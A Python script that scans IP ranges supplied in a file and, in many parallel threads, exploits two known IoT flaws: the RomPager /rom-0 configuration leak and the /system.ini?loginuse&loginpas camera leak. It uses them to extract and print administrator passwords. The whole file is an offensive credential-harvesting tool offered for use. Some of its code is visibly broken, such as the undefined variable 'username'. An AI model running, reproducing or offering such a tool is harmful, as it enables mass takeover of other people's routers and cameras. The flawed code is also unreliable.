import re
import sys
import threading
import requests

from deps.lzs_decompress import LZSDecompress
from deps.lzs_decompress import RingList

iots = []

def another_exploit(host, thread):
    print(f"Thread #{thread} ({host}) - extracting system.ini file ...")
    try:
        response = requests.get(f"http://{host}/system.ini?loginuse&loginpas", verify=False, timeout=1)
    except Exception:
        print(f"Thread #{thread} ({host}) - connection rejected")
        return

    if response.status_code != 200:
        print(f"Thread #{thread} ({host}) - IoT device is not vulnerable")
        return

    print(f"Thread #{thread} ({host}) - IoT device is vulnerable, file extracted")
    print(f"Thread #{thread} ({host}) - extracting IoT device credentials ...")

    strings = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)
    if username in strings:
        username_index = strings.index('admin')
        password = strings[username_index + 1]

        print(f"Thread #{thread} ({host}) - got IoT device credentials")
        print(f"Thread #{thread} ({host}) - admin:{password}")

        iots.append(f"Thread #{thread} ({host}) - admin:{password}")
    else:
        print(f"Thread #{thread} ({host}) - failed to get credentials")

def exploit(host, thread):
    print(f"Thread #{thread} ({host}) - extracting rom file ...")
    try:
        response = requests.get(f"http://{host}/rom-0", verify=False, timeout=1)
    except Exception:
        another_exploit(host, thread)
        return

    if response.status_code != 200:
        another_exploit(host, thread)
        return

    print(f"Thread #{thread} ({host}) - IoT device is vulnerable, file extracted")
    print(f"Thread #{thread} ({host}) - extracting IoT device credentials ...")

    data = response.content[8568:]
    result, window = LZSDecompress(data, RingList(2048))

    password = re.findall("([\040-\176]{5,})", result)

    if password[0]:
        print(f"Thread #{thread} ({host}) - got IoT device credentials")
        print(f"Thread #{thread} ({host}) - admin:{password}")

        iots.append(f"Thread #{thread} ({host}) - admin:{password}")

if len(sys.argv) < 2:
    print("Usage: rompager_exploit.py <ranges_file>")
    sys.exit(1)

with open(sys.argv[1], 'r') as f:
    lines = f.read().strip().split('\n')
    counter = 0
    for line in lines:
        addr_range = line.split('-')
        max_addr = addr_range[1][::-1].split('.')[0][::-1]

        for i in range(int(max_addr)+1):
            host = addr_range[0][::-1].replace('0', str(i)[::-1], 1)[::-1]
            print(f"Initializing thread #{str(counter)} ({host}) ...")

            print(f"Thread #{str(counter)} ({host}) - running exploit operations ...")
            thread = threading.Thread(target=exploit, args=[host, str(counter)])
            thread.start()

            print(f"Initialized thread #{str(counter)} ({host})")
            counter += 1

for i in iots:
    print(i)
